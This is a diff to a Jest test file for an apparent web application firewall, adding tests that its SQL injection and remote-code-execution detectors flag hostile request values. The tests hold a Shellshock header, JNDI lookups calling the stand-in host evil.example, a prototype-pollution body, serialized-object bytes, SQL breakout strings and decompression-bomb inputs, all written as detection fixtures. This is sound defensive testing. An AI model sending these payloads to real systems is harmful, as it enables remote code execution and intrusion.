@@ -1,4 +1,5 @@
 const fs = require('fs');
+const zlib = require('zlib');
 const path = require('path');
 const { createInspector } = require('../lib/sqlInjection');
 const wasmChecks = require('../lib/wasmChecks');
@@ -37,7 +38,7 @@ describe('bounded SQL injection inspection', () => {
   test('supports off and monitor without including secrets in findings', () => {
     expect(createInspector({ AIWAF_SQL_INJECTION_MODE: 'off' })({ body: "admin'--" })).toBeNull();
     expect(createInspector({ AIWAF_SQL_INJECTION_MODE: 'monitor' })({ body: "admin'--" }))
-      .toEqual({ rule: 'sql_breakout_single_quote', status: 403, mode: 'monitor' });
+      .toEqual({ rule: 'sql_breakout_single_quote', status: 403, mode: 'monitor', source: 'payload' });
     expect(() => createInspector({ AIWAF_SQL_INJECTION_MODE: 'typo' })).toThrow();
   });
   test('does not consume unparsed upload streams', () => {
@@ -118,5 +119,59 @@ describe('URL path', () => {
     expect(cases.attacks.filter(url => !inspect(url))).toEqual([]);
     // A query string is checked on its own, as a query.
     expect(cases.ordinary.filter(url => inspect(url.split('?')[0]))).toEqual([]);
+  });
+});
+
+describe('remote code execution in request values', () => {
+  const RCE = JSON.parse(fs.readFileSync(path.join(FIXTURES, 'rce_cases.json'), 'utf8'));
+  const inspect = createInspector();
+
+  test.each(RCE.attacks)('finds %s', (value, rule) => {
+    expect(inspect({ body: { field: value } })).toMatchObject({ rule, status: 403 });
+  });
+
+  test('passes ordinary text, and checks headers SQL skips', () => {
+    expect([...RCE.ordinary, ...ORDINARY].filter(value => inspect({ body: { field: value } })?.rule?.startsWith('rce_'))).toEqual([]);
+    expect(inspect({ headers: { 'user-agent': '() { :; }; /bin/bash -c id' } })).toMatchObject({ rule: 'rce_shellshock' });
+    expect(inspect({ headers: { accept: '${jndi:ldap://evil.example/a}' } })).toMatchObject({ rule: 'rce_jndi_lookup' });
+    expect(inspect({ url: '/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fx%7D' })).toMatchObject({ rule: 'rce_jndi_lookup' });
+  });
+
+  test.each([...RCE.form_attacks, ...RCE.json_attacks])('finds %s in a raw body', (body, rule) => {
+    expect(inspect({ body: Buffer.from(body) })).toMatchObject({ rule, status: 403 });
+  });
+
+  test.each(RCE.form_attacks)('finds %s in a query string', (query, rule) => {
+    expect(inspect({ url: `/search?${query}` })).toMatchObject({ rule, status: 403 });
+  });
+
+  test('finds prototype keys in a parsed body, binary and gzip bodies, and passes ordinary forms', () => {
+    // JSON.parse keeps "__proto__" as an own key, which a body parser then hands on.
+    expect(inspect({ body: JSON.parse('{"user":{"__proto__":{"shell":"/bin/sh"}}}') })).toMatchObject({ rule: 'rce_prototype_pollution' });
+    expect(inspect({ body: Buffer.from([0xac, 0xed, 0x00, 0x05, 0x73, 0x72, 0x00, 0x11]) })).toMatchObject({ rule: 'rce_serialized_object' });
+    expect(inspect({ body: zlib.gzipSync('{"q":"${jndi:ldap://evil.example/a}"}') })).toMatchObject({ rule: 'rce_jndi_lookup' });
+    expect(inspect({ body: zlib.gzipSync(Buffer.alloc(10 << 20, 97)) })).toMatchObject({ rule: 'payload_inspection_limit', status: 413 });
+    expect([...RCE.ordinary_forms, ...RCE.ordinary_json].filter(body => inspect({ body: Buffer.from(body) }))).toEqual([]);
+  });
+
+  test.each(RCE.multipart_attacks)('finds %s in a multipart body', (body, rule) => {
+    expect(inspect({ body: Buffer.from(body) })).toMatchObject({ rule, status: 403 });
+  });
+
+  test('passes ordinary multipart bodies, decodes br, refuses unreadable encodings and header floods', () => {
+    expect(RCE.ordinary_multipart.filter(body => inspect({ body: Buffer.from(body) }))).toEqual([]);
+    const br = zlib.brotliCompressSync('{"q":"${jndi:ldap://evil.example/a}"}');
+    expect(inspect({ body: br, headers: { 'content-encoding': 'br' } })).toMatchObject({ rule: 'rce_jndi_lookup' });
+    expect(inspect({ body: zlib.brotliCompressSync('{"q":"fine"}'), headers: { 'content-encoding': 'br' } })).toBeNull();
+    expect(inspect({ body: zlib.brotliCompressSync(Buffer.alloc(1 << 20, 97)), headers: { 'content-encoding': 'br' } }))
+      .toMatchObject({ rule: 'payload_inspection_limit', status: 413 });
+    expect(inspect({ body: Buffer.from('not brotli'), headers: { 'content-encoding': 'br' } })).toMatchObject({ status: 413 });
+    expect(inspect({ body: Buffer.from('{}'), headers: { 'content-encoding': 'zstd' } })).toMatchObject({ status: 413 });
+    // A parsed body was already decoded by its parser.
+    expect(inspect({ body: { q: 'fine' }, headers: { 'content-encoding': 'br' } })).toBeNull();
+    const headers = Object.fromEntries(Array.from({ length: 100 }, (_, i) => [`x-pad-${i}`, 'ordinary']));
+    expect(inspect({ headers: { ...headers, 'x-last': "1' OR '1'='1" } })).toMatchObject({ status: 403 });
+    const flood = Object.fromEntries(Array.from({ length: 300 }, (_, i) => [`x-pad-${i}`, 'ordinary']));
+    expect(inspect({ headers: flood })).toMatchObject({ rule: 'payload_inspection_limit', status: 413 });
   });
 });
